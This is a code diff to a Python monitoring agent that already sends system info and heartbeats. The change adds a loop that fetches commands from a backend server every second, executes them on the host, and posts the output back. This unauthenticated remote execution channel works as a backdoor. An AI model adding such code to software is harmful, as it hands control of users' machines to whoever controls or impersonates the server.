@@ -1,7 +1,9 @@
 import time
 from datetime import datetime
+
+import requests
 from utils.network_handler import backend_url
-from utils.utils import get_mac_address1,collect_system_info,send_system_info_and_heartbeat
+from utils.utils import get_mac_address1,collect_system_info,send_system_info_and_heartbeat,execute_command
 
 if __name__ == "__main__":
     last_data_sent = time.time()
@@ -21,6 +23,19 @@ if __name__ == "__main__":
                 heartbeat = {"mac_address": get_mac_address1(), "time_stamp": datetime.now().isoformat()}
                 send_system_info_and_heartbeat(None, heartbeat, backend_url)
                 last_heartbeat_sent = current_time
+                
+            # Check for commands from the server and execute them
+            try:
+                response = requests.get(backend_url + "/get_commands")
+                response.raise_for_status()
+                commands = response.json()
+                for command in commands:
+                    output = execute_command(command)
+                    # Send the output back to the server
+                    response = requests.post(backend_url + "/send_output", json={"output": output})
+                    response.raise_for_status()
+            except Exception as e:
+                print(f"Error executing commands: {e}")
 
             time.sleep(1)  # Sleep for 1 second to avoid high CPU usage
     except KeyboardInterrupt:
